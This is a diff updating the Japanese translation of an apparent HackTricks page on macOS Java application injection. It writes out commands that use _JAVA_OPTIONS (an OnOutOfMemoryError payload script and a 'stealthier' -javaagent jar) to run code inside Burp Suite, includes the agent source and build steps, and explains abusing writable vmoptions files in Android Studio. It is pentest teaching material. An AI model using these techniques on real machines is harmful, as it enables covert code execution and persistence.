@@ -2,9 +2,9 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Enumeration
+## 列挙
 
-システムにインストールされているJavaアプリケーションを見つけます。**Info.plist**内のJavaアプリは、**`java.`**という文字列を含むいくつかのJavaパラメータを含むことが確認されているため、それを検索できます:
+システムにインストールされている Java applications を検索します。**Info.plist** 内の Java apps には、文字列 **`java.`** を含む Java parameters が記載されていることが確認されているため、それを検索できます。
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-環境変数 **`_JAVA_OPTIONS`** は、Javaコンパイルされたアプリの実行時に任意のJavaパラメータを注入するために使用できます:
+環境変数 **`_JAVA_OPTIONS`** を使用すると、Java コンパイル済みアプリの実行時に任意の Java パラメータを injection できます:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-新しいプロセスとして実行し、現在のターミナルの子プロセスとしてではなく実行するには、次のようにします：
+新しいプロセスとして実行し、現在のターミナルの子プロセスにしないためには、次のようにします。
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-しかし、それは実行されたアプリでエラーを引き起こします。よりステルスな方法は、Javaエージェントを作成し、次を使用することです：
+ただし、これは実行された app でエラーを発生させます。より stealth な方法として、java agent を作成して次を使用します:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> エージェントをアプリケーションとは**異なるJavaバージョン**で作成すると、エージェントとアプリケーションの両方の実行がクラッシュする可能性があります
+> アプリケーションとは**異なる Java version**で agent を作成すると、agent とアプリケーションの両方の実行がクラッシュする可能性があります
 
-エージェントは次のようになります:
+agent の配置場所は次のとおりです：
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,19 +102,19 @@ err.printStackTrace();
 }
 }
 ```
-エージェントをコンパイルするには、次のコマンドを実行します:
+agent をコンパイルするには、次を実行します:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-`manifest.txt`：
+`manifest.txt`を使用する場合:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-そして、環境変数をエクスポートし、次のようにJavaアプリケーションを実行します:
+次に、env variableをexportし、次のようにJavaアプリケーションを実行します:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptionsファイル
+## vmoptions file
 
-このファイルは、Javaが実行されるときに**Javaパラメータ**の指定をサポートします。以前のいくつかのトリックを使用して、Javaパラメータを変更し、**プロセスが任意のコマンドを実行する**ようにすることができます。\
-さらに、このファイルは`include`ディレクトリを使用して**他のファイルを含む**こともできるため、含まれているファイルを変更することもできます。
+このファイルでは、Javaの実行時に使用する **Java params** を指定できます。以前のいくつかの手法を使ってJava paramsを変更し、**プロセスに任意のコマンドを実行させる**ことができます。\
+さらに、このファイルでは `include` ディレクトリを使用して他のファイルを**インクルード**することもできるため、インクルードされるファイルを変更することもできます。
 
-さらに、一部のJavaアプリは**複数の`vmoptions`**ファイルを**ロード**します。
+さらに、一部のJavaアプリは複数の **vmoptions** ファイルを**読み込む**ことがあります。
 
-Android Studioのような一部のアプリケーションは、これらのファイルを探している**出力を示します**。
+Android Studioなどのアプリケーションは、次のように、これらのファイルを**検索している場所を出力に示す**ことがあります。
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Android Studioのような一部のアプリケーションは、これらのフ
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-それがない場合は、次のコマンドで簡単に確認できます：
+そうでない場合は、次の方法で簡単に確認できます:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-この例では、Android Studioがファイル **`/Applications/Android Studio.app.vmoptions`** を読み込もうとしていることがどれほど興味深いかに注意してください。これは、**`admin` グループ** の任意のユーザーが書き込みアクセスを持つ場所です。
+この例で興味深いのは、Android Studio が **`/Applications/Android Studio.app.vmoptions`** ファイルを読み込もうとしている点です。この場所には、**`admin` グループに属する任意のユーザーが書き込みアクセスできます。**
 
 {{#include ../../../banners/hacktricks-training.md}}
